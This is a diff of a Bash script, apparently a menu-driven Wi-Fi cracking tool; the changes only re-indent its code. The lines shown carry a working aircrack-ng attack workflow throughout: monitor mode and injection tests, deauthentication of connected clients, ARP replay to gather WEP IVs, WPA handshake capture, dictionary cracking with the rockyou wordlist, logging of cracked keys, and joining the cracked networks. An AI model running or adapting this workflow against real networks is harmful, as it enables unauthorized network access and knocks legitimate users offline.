@@ -49,23 +49,23 @@ fi
 
 # Check for wireless device
 if [ $monitor ]; then
-	airmon-ng stop $interface &>/dev/null
+     airmon-ng stop $interface &>/dev/null
 fi
 
 if [ $interface ]; then
-	echo
-     echo -e "\e[1;33m[*] Initializing $interface wireless interface using kernel module $kernmod.\e[0m"
-	killall dhclient3 &>/dev/null
-	airmon-ng start $interface &>/dev/null
-	iwconfig > tmp 2>/dev/null
-	monitor=$(grep -m 1 'Monitor' tmp | awk '{print $1}')
-	rm tmp 2>/dev/null
-else
-	zenity --error --text "No wireless device found. If you are using a VM, make sure your USB card is enabled."
-	rm tmp 2>/dev/null
-	echo
      echo
-	exit
+     echo -e "\e[1;33m[*] Initializing $interface wireless interface using kernel module $kernmod.\e[0m"
+     killall dhclient3 &>/dev/null
+     airmon-ng start $interface &>/dev/null
+     iwconfig > tmp 2>/dev/null
+     monitor=$(grep -m 1 'Monitor' tmp | awk '{print $1}')
+     rm tmp 2>/dev/null
+else
+     zenity --error --text "No wireless device found. If you are using a VM, make sure your USB card is enabled."
+     rm tmp 2>/dev/null
+     echo
+     echo
+     exit
 fi
 
 ##############################################################################################################
@@ -77,58 +77,58 @@ aireplay-ng -9 $monitor > tmp
 sleep 3
 
 if grep -q 'Injection is working!' tmp; then
-	rm tmp 2>/dev/null
+     rm tmp 2>/dev/null
 else
-	zenity --error --text "Injection is not working. Reconnect your wireless card and try again."
-	rm tmp 2>/dev/null
-	echo
+     zenity --error --text "Injection is not working. Reconnect your wireless card and try again."
+     rm tmp 2>/dev/null
      echo
-	exit
+     echo
+     exit
 fi
 
 ##############################################################################################################
 
 # Check working directory
 if [ ! -d $workdir ]; then
-	mkdir $workdir
+     mkdir $workdir
 fi
 
 # Generate $workdir/keys file
 if [ -f $workdir/keys ]; then
-	echo
-	delimetertest=$(grep '\^' $workdir/keys)
+     echo
+     delimetertest=$(grep '\^' $workdir/keys)
 
-	if [ -z $delimetertest ]; then
-		echo "Your $workdir/keys file is out of date. You need to open it in a text editor and replace all appropriate spaces with ^ symbols."
-		echo "The lines in the file should look like below when this has been done correctly. Do this for all the lines."
-		echo ""
-		echo "No^Network^Ch^Password^Encryption^IVs^Notes"
-		echo "1^WIFINET^8^passphrase1^WPA^n/a^First network passphrase guessed"
-		echo "2^WIFI NET^5^passphrase2^WPA^n/a^Note that this ESSID has a space in the name"
-		echo ""
-		echo "Make these changes, then re-launch the program."
-		echo
+     if [ -z $delimetertest ]; then
+          echo "Your $workdir/keys file is out of date. You need to open it in a text editor and replace all appropriate spaces with ^ symbols."
+          echo "The lines in the file should look like below when this has been done correctly. Do this for all the lines."
+          echo ""
+          echo "No^Network^Ch^Password^Encryption^IVs^Notes"
+          echo "1^WIFINET^8^passphrase1^WPA^n/a^First network passphrase guessed"
+          echo "2^WIFI NET^5^passphrase2^WPA^n/a^Note that this ESSID has a space in the name"
+          echo ""
+          echo "Make these changes, then re-launch the program."
+          echo
           echo
           exit
-	fi
+     fi
 
 else
-	echo No^Network^Ch^Password^Encryption^IVs^Notes > $workdir/keys
+     echo No^Network^Ch^Password^Encryption^IVs^Notes > $workdir/keys
 fi
 
 # Generate .editor config file
 if [ -f .editor ]; then
      Editor=`cat .editor`
 else
-	zenity --question --text "What is your default text editor?" --cancel-label=vi --ok-label=gedit
+     zenity --question --text "What is your default text editor?" --cancel-label=vi --ok-label=gedit
 
-	if [ $? = 0 ]; then
-	     Editor=gedit
-		echo gedit > .editor
-	else
-		Editor=vi
-		echo vi > .editor
-	fi
+     if [ $? = 0 ]; then
+          Editor=gedit
+          echo gedit > .editor
+     else
+          Editor=vi
+          echo vi > .editor
+     fi
 fi
 
 f_menu
@@ -211,82 +211,82 @@ column -s ^ -t $workdir/keys
 zz=$(zenity --list --column "                   Cracked Networks" --text "" "Edit file" "Join a network")
 
 if [[ $zz = "Edit file" ]]; then
-	$Editor $workdir/keys
-	f_menu
+     $Editor $workdir/keys
+     f_menu
 elif [[ $zz =  "Join a network" ]]; then
-	No=`zenity --entry --text "Enter the number of the network you wish to join:"`
+     No=`zenity --entry --text "Enter the number of the network you wish to join:"`
      let line=$No+1
      head -n $line $workdir/keys | tail -n 1 > tmp
-	x=$(cat tmp | awk -F"^" '{print $2}')
-	y=$(cat tmp | awk -F"^" '{print $4}')
-	z=$(cat tmp | awk -F"^" '{print $5}')
-	echo
-	echo $break
-	echo
+     x=$(cat tmp | awk -F"^" '{print $2}')
+     y=$(cat tmp | awk -F"^" '{print $4}')
+     z=$(cat tmp | awk -F"^" '{print $5}')
+     echo
+     echo $break
+     echo
 
-	if [ $z = "WPA" ]; then
-		# WPA join code goes here
-		wpakey=$(wpa_passphrase "$x" $y | grep 'psk' | grep -v '#psk' | awk -F"=" {'print $2'})
-		wpasupp=/tmp/wpa_supplicant.conf
-	     # Create /tmp/wpa_supplicant.conf file
-	     echo "" > $wpasupp
-	     echo "ctrl_interface=/var/run/wpa_supplicant" >> $wpasupp
-	     echo "" >> $wpasupp
-	     echo "network={" >> $wpasupp
-	     echo "   ssid=\"$x\"" >> $wpasupp
-	     echo "   scan_ssid=1" >> $wpasupp
-	     echo "   proto=WPA RSN" >> $wpasupp
-	     echo "   key_mgmt=WPA-PSK" >> $wpasupp
-	     echo "   pairwise=CCMP TKIP" >> $wpasupp
-	     echo "   group=CCMP TKIP" >> $wpasupp
-	     echo "   psk=$wpakey" >> $wpasupp
-	     echo "}" >> $wpasupp
+     if [ $z = "WPA" ]; then
+          # WPA join code goes here
+          wpakey=$(wpa_passphrase "$x" $y | grep 'psk' | grep -v '#psk' | awk -F"=" {'print $2'})
+          wpasupp=/tmp/wpa_supplicant.conf
+          # Create /tmp/wpa_supplicant.conf file
+          echo "" > $wpasupp
+          echo "ctrl_interface=/var/run/wpa_supplicant" >> $wpasupp
+          echo "" >> $wpasupp
+          echo "network={" >> $wpasupp
+          echo "   ssid=\"$x\"" >> $wpasupp
+          echo "   scan_ssid=1" >> $wpasupp
+          echo "   proto=WPA RSN" >> $wpasupp
+          echo "   key_mgmt=WPA-PSK" >> $wpasupp
+          echo "   pairwise=CCMP TKIP" >> $wpasupp
+          echo "   group=CCMP TKIP" >> $wpasupp
+          echo "   psk=$wpakey" >> $wpasupp
+          echo "}" >> $wpasupp
 
-	     wpa_supplicant -B -i$interface -Dwext -c$wpasupp
-	     sleep 2
+          wpa_supplicant -B -i$interface -Dwext -c$wpasupp
+          sleep 2
 
-	     dhclient $interface
-	     sleep 2
+          dhclient $interface
+          sleep 2
 
-	     echo
-	     echo "Now connected to the wireless network \"$x\"."
-	     echo
-	     echo -n "When ready to disconnect, type EXIT and press <return> to continue: "; read DISC
+          echo
+          echo "Now connected to the wireless network \"$x\"."
+          echo
+          echo -n "When ready to disconnect, type EXIT and press <return> to continue: "; read DISC
 
-	     if [ $DISC = "EXIT" ]; then
-	          killall -q wpa_supplicant
-	          killall -q dhclient
-	          ifconfig $interface down
-	          sleep 5
-	          f_menu
-		else
-		     $ERROR
-	     fi
+          if [ $DISC = "EXIT" ]; then
+               killall -q wpa_supplicant
+               killall -q dhclient
+               ifconfig $interface down
+               sleep 5
+               f_menu
+          else
+               $ERROR
+          fi
 
-	elif [ $z = "WEP" ]; then
-		# WEP join code goes here
-		airmon-ng stop $monitor &>/dev/null
-		ifconfig $interface down
-		iwconfig $interface essid "$x" key "$y"
-		ifconfig $interface up
-		sleep 1
+     elif [ $z = "WEP" ]; then
+          # WEP join code goes here
+          airmon-ng stop $monitor &>/dev/null
+          ifconfig $interface down
+          iwconfig $interface essid "$x" key "$y"
+          ifconfig $interface up
+          sleep 1
 
-		dhclient $interface
-		echo
-		echo
-		echo "Now connected to the wireless network \"$x\"."
-		echo
-		echo -n "When ready to disconnect, type EXIT and press <return> to continue: " ; read DISC
+          dhclient $interface
+          echo
+          echo
+          echo "Now connected to the wireless network \"$x\"."
+          echo
+          echo -n "When ready to disconnect, type EXIT and press <return> to continue: " ; read DISC
 
-		if [ $DISC = "EXIT" ]; then
-		     killall -q dhclient
-		     ifconfig $interface down
-		     sleep 3
-		     f_menu
-		else
-			f_menu
-		fi
-	fi
+          if [ $DISC = "EXIT" ]; then
+               killall -q dhclient
+               ifconfig $interface down
+               sleep 3
+               f_menu
+          else
+               f_menu
+          fi
+     fi
 fi
 }
 
@@ -303,13 +303,13 @@ read ESSID
 
 # Check for no answer
 if [ -z "$ESSID" ]; then
-	f_error
+     f_error
 fi
 
 if grep -q '$ESSID' $workdir/keys; then
-	echo
-	zenity --info --text "This network has already been cracked."
-	f_menu
+     echo
+     zenity --info --text "This network has already been cracked."
+     f_menu
 fi
 
 echo -n "Channel:  "
@@ -319,7 +319,7 @@ f_validChannel $Channel
 
 # Check for no answer
 if [ -z $Channel ]; then
-	f_error
+     f_error
 fi
 
 echo -n "BSSID:    "
@@ -327,7 +327,7 @@ read BSSID
 
 # Check for no answer
 if [ -z $BSSID ]; then
-	f_error
+     f_error
 fi
 
 # Validate MAC address
@@ -372,13 +372,13 @@ f_validChannel(){
 check=$(echo $1 | grep -e [^0-9])
 
 if [ $? -eq 0 ]; then
-	f_error
+     f_error
 fi
 
 if [ "$1" != "" ]; then
-	if [ $1 -lt 1 ] || [ $1 -gt 11 ]; then
-		f_error
-	fi
+     if [ $1 -lt 1 ] || [ $1 -gt 11 ]; then
+          f_error
+     fi
 fi
 }
 
@@ -433,29 +433,29 @@ f_validChannel $Channel
 # Optimized for 17" MacBook Pro 1920x1200, change the geometry as needed (width x height + x + y)
 
 if [ $resolution -ge "1900" ]; then
- 	if [ -z $Channel ]; then
-		xterm -bg blue -fg white -fn 10x20 -geometry 94x60+0+0 -title WEP -e airodump-ng --encrypt wep $monitor --output-format pcap &
-		sleep 1
-		xterm -bg blue -fg white -fn 10x20 -geometry 94x60+955+0 -title WPA -e airodump-ng --encrypt wpa $monitor --output-format pcap &
-		f_menu
- 	else
-		xterm -bg blue -fg white -fn 10x20 -geometry 94x60+0+0 -title WEP -e airodump-ng --channel $Channel --encrypt wep $monitor --output-format pcap &
-		sleep 1
-		xterm -bg blue -fg white -fn 10x20 -geometry 94x60+955+0 -title WPA -e airodump-ng --channel $Channel --encrypt wpa $monitor --output-format pcap &
-		f_menu
- 	fi
+     if [ -z $Channel ]; then
+          xterm -bg blue -fg white -fn 10x20 -geometry 94x60+0+0 -title WEP -e airodump-ng --encrypt wep $monitor --output-format pcap &
+          sleep 1
+          xterm -bg blue -fg white -fn 10x20 -geometry 94x60+955+0 -title WPA -e airodump-ng --encrypt wpa $monitor --output-format pcap &
+          f_menu
+     else
+          xterm -bg blue -fg white -fn 10x20 -geometry 94x60+0+0 -title WEP -e airodump-ng --channel $Channel --encrypt wep $monitor --output-format pcap &
+          sleep 1
+          xterm -bg blue -fg white -fn 10x20 -geometry 94x60+955+0 -title WPA -e airodump-ng --channel $Channel --encrypt wpa $monitor --output-format pcap &
+          f_menu
+     fi
 else
- 	if [ -z $Channel ]; then
-		xterm -bg blue -fg white -geometry 125x25+0+10 -title WEP -e airodump-ng --encrypt wep $monitor &
-		sleep 1
-		xterm -bg blue -fg white -geometry 125x25+0+425 -title WPA -e airodump-ng --encrypt wpa $monitor &
-		f_menu
- 	else
-		xterm -bg blue -fg white -geometry 125x25+0+10 -title WEP -e airodump-ng --channel $Channel --encrypt wep $monitor &
-		sleep 1
-		xterm -bg blue -fg white -geometry 125x25+0+425 -title WPA -e airodump-ng --channel $Channel --encrypt wpa $monitor &
-		f_menu
- 	fi
+     if [ -z $Channel ]; then
+          xterm -bg blue -fg white -geometry 125x25+0+10 -title WEP -e airodump-ng --encrypt wep $monitor &
+          sleep 1
+          xterm -bg blue -fg white -geometry 125x25+0+425 -title WPA -e airodump-ng --encrypt wpa $monitor &
+          f_menu
+     else
+          xterm -bg blue -fg white -geometry 125x25+0+10 -title WEP -e airodump-ng --channel $Channel --encrypt wep $monitor &
+          sleep 1
+          xterm -bg blue -fg white -geometry 125x25+0+425 -title WPA -e airodump-ng --channel $Channel --encrypt wpa $monitor &
+          f_menu
+     fi
 fi
 }
 
@@ -492,24 +492,24 @@ read Channel
 f_validChannel $Channel
 
 if [ -z $Channel ]; then
-	airodump-ng --encrypt WEP $monitor
+     airodump-ng --encrypt WEP $monitor
 else
-	airodump-ng --channel $Channel --encrypt WEP $monitor
+     airodump-ng --channel $Channel --encrypt WEP $monitor
 fi
 
 zenity --question --text "Is the network you want to attack hidden (non-broadcasted SSID)?"
 
 if [ $? = 0 ]; then
-	a=$(zenity --entry --text "BSSID of target")
-	e=$(zenity --entry --text "STATION MAC currently connected")
+     a=$(zenity --entry --text "BSSID of target")
+     e=$(zenity --entry --text "STATION MAC currently connected")
 
-	echo "Enter a channel that the hidden network is running on."
-	echo -n "Channel (1-11): "
-	read Channel
-	f_validChannel $Channel
+     echo "Enter a channel that the hidden network is running on."
+     echo -n "Channel (1-11): "
+     read Channel
+     f_validChannel $Channel
 
-	xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+0 -hold -e airodump-ng -c $Channel --bssid $a -w output $monitor &
-	xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+300 -hold -e aireplay-ng -0 30 -a $a -c $e $monitor &
+     xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+0 -hold -e airodump-ng -c $Channel --bssid $a -w output $monitor &
+     xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+300 -hold -e aireplay-ng -0 30 -a $a -c $e $monitor &
 fi
 
 f_options
@@ -520,7 +520,7 @@ read STATION
 
 # Check for no answer
 if [ -z $STATION ]; then
-	f_error
+     f_error
 fi
 
 # Validate MAC address
@@ -533,10 +533,10 @@ fi
 # Optimized for 17" MacBook Pro 1920x1200, change the geometry as needed (width x height + x + y)
 
 if [ $Channel = "?" ]; then
-	xterm -bg blue -fg white -fn 10x20 -geometry 94x9+965+308 -hold -title "Deauthentication" -e aireplay-ng --deauth 10 -a $BSSID -c $STATION $monitor &
-	echo -n "ESSID: "
-	read ESSID
-	pkill -9 -f xterm 2>/dev/null
+     xterm -bg blue -fg white -fn 10x20 -geometry 94x9+965+308 -hold -title "Deauthentication" -e aireplay-ng --deauth 10 -a $BSSID -c $STATION $monitor &
+     echo -n "ESSID: "
+     read ESSID
+     pkill -9 -f xterm 2>/dev/null
 fi
 
 xterm -bg blue -fg white -fn 10x20 -geometry 94x14+965+0 -hold -e airodump-ng -c $Channel --bssid $BSSID -w output $monitor &
@@ -547,9 +547,9 @@ sleep 20
 zenity --question --text "Has association been successful?"
 
 if [ $? = 1 ]; then
-	zenity --info --text "MAC address filtering may be enabled."
-	pkill -9 -f xterm 2>/dev/null
-	f_menu
+     zenity --info --text "MAC address filtering may be enabled."
+     pkill -9 -f xterm 2>/dev/null
+     f_menu
 fi
 
 xterm -bg blue -fg white -fn 10x20 -geometry 94x6+965+545 -hold -title "ARP Replay" -e aireplay-ng --arpreplay -b $BSSID -h $FakeMAC $monitor &
@@ -558,15 +558,15 @@ sleep 30
 zenity --question --text "Look in the airodump-ng window. Is the value for #Data increasing?"
 
 if [ $? = 1 ]; then
-	pkill -9 -f xterm 2>/dev/null
-	f_menu
+     pkill -9 -f xterm 2>/dev/null
+     f_menu
 fi
 
 sleep 60
 
 aircrack-ng -a 1 *.cap
 
-pkill -9 xterm 2>/dev/null			# BUG - this is not working.  Still seeing output on the screen
+pkill -9 xterm 2>/dev/null               # BUG - this is not working.  Still seeing output on the screen
 
 echo "Your results will be saved to a file."
 echo
@@ -597,18 +597,18 @@ echo -n "Would you like to connect to the wireless network? y/n  "
 read -n 1 connect
 
 if [ $connect == y ]; then
-	pkill -9 -f xterm 2>/dev/null
-	ifconfig $interface down
-	iwconfig $interface essid "$ESSID" key $KEY
-	ifconfig $interface up
-	sleep 1
-	dhclient $interface
-	echo
-	echo "Now connected to the new wireless network."
-	f_menu
+     pkill -9 -f xterm 2>/dev/null
+     ifconfig $interface down
+     iwconfig $interface essid "$ESSID" key $KEY
+     ifconfig $interface up
+     sleep 1
+     dhclient $interface
+     echo
+     echo "Now connected to the new wireless network."
+     f_menu
 else
-	pkill -9 -f xterm 2>/dev/null
-	f_menu
+     pkill -9 -f xterm 2>/dev/null
+     f_menu
 fi
 }
 
@@ -638,9 +638,9 @@ read Channel
 f_validChannel $Channel
 
 if [ -z $Channel ]; then
-	airodump-ng --encrypt WPA $monitor
+     airodump-ng --encrypt WPA $monitor
 else
-	airodump-ng --channel $Channel --encrypt WPA $monitor
+     airodump-ng --channel $Channel --encrypt WPA $monitor
 fi
 
 zenity --question --text "Is the network you want to attack hidden (non-broadcasted SSID)?"
@@ -658,7 +658,7 @@ read STATION
 
 # Check for no answer
 if [ -z $STATION ]; then
-	f_error
+     f_error
 fi
 
 # Validate MAC address
@@ -677,56 +677,56 @@ sleep 30
 zenity --question --text "Look in the airodump-ng window. Has a WPA handshake occured? If not, continue to wait. If so, click Yes."
 
 if [ $? = 0 ]; then
-	zenity --question --text "Would you like to store the capture file containing the handshake for later attack?"
+     zenity --question --text "Would you like to store the capture file containing the handshake for later attack?"
 
-	if [ $? = 0 ]; then
-		pkill -9 -f xterm 2>/dev/null
-		FIXEDESSID=$(echo "$ESSID" | sed 's/ /\\ /')
+     if [ $? = 0 ]; then
+          pkill -9 -f xterm 2>/dev/null
+          FIXEDESSID=$(echo "$ESSID" | sed 's/ /\\ /')
 
-		if [ ! -d "$workdir/$datestamp/$FIXEDESSID" ]; then
-			mkdir -p "$workdir/$datestamp/$FIXEDESSID"
-		fi
+          if [ ! -d "$workdir/$datestamp/$FIXEDESSID" ]; then
+               mkdir -p "$workdir/$datestamp/$FIXEDESSID"
+          fi
 
-		cp output* "$workdir/$datestamp/$FIXEDESSID"
-		echo "Capture file(s) saved in $workdir/$datestamp/$FIXEDESSID"
-		zenity --question --text "Would you like to save the capture file(s) to the desktop as well?"
+          cp output* "$workdir/$datestamp/$FIXEDESSID"
+          echo "Capture file(s) saved in $workdir/$datestamp/$FIXEDESSID"
+          zenity --question --text "Would you like to save the capture file(s) to the desktop as well?"
 
-		if [ $? = 0 ]; then
-			cp output* ~/Desktop
-		fi
+          if [ $? = 0 ]; then
+               cp output* ~/Desktop
+          fi
 
-		read -p "Press <return> to continue."
-		f_menu
-	fi
+          read -p "Press <return> to continue."
+          f_menu
+     fi
 
-	zenity --info --text="Select a wordlist."
-	wordlist=`zenity --file-selection --filename=/pentest/passwords/wordlists/rockyou.txt`
+     zenity --info --text="Select a wordlist."
+     wordlist=`zenity --file-selection --filename=/pentest/passwords/wordlists/rockyou.txt`
 
-	pkill -9 -f xterm 2>/dev/null
+     pkill -9 -f xterm 2>/dev/null
 
-	aircrack-ng -a 2 --bssid $BSSID *.cap -w $wordlist
+     aircrack-ng -a 2 --bssid $BSSID *.cap -w $wordlist
 
-	echo "Your results will be saved to a file."
-	echo
-	echo "ESSID:   " "$ESSID"
-	echo "Channel: " $Channel
-	unset KEY
-	echo -n "KEY:      " $KEY
-	read KEY
-	unset Notes
-	echo -n "Notes:    " $Notes
-	read Notes
+     echo "Your results will be saved to a file."
+     echo
+     echo "ESSID:   " "$ESSID"
+     echo "Channel: " $Channel
+     unset KEY
+     echo -n "KEY:      " $KEY
+     read KEY
+     unset Notes
+     echo -n "Notes:    " $Notes
+     read Notes
 
-	No=`wc -l $workdir/keys | awk '{print $1}'`
+     No=`wc -l $workdir/keys | awk '{print $1}'`
 
-	# Reference: No Network Ch Password Encryption IVs Notes > $workdir/keys
-	echo "$No^$ESSID^$Channel^$KEY^WPA^n/a^$Notes" >> $workdir/keys
-	f_return
+     # Reference: No Network Ch Password Encryption IVs Notes > $workdir/keys
+     echo "$No^$ESSID^$Channel^$KEY^WPA^n/a^$Notes" >> $workdir/keys
+     f_return
 else
-	pkill -9 -f xterm 2>/dev/null
-	# kill -9 `ps ax | grep 'airodump-ng' | grep -v 'grep' | awk {'print $1'}` 2>/dev/null
-	# kill -9 `ps ax | grep 'aireplay-ng' | grep -v 'grep' | awk {'print $1'}` 2>/dev/null
-	f_return
+     pkill -9 -f xterm 2>/dev/null
+     # kill -9 `ps ax | grep 'airodump-ng' | grep -v 'grep' | awk {'print $1'}` 2>/dev/null
+     # kill -9 `ps ax | grep 'aireplay-ng' | grep -v 'grep' | awk {'print $1'}` 2>/dev/null
+     f_return
 fi
 }
 
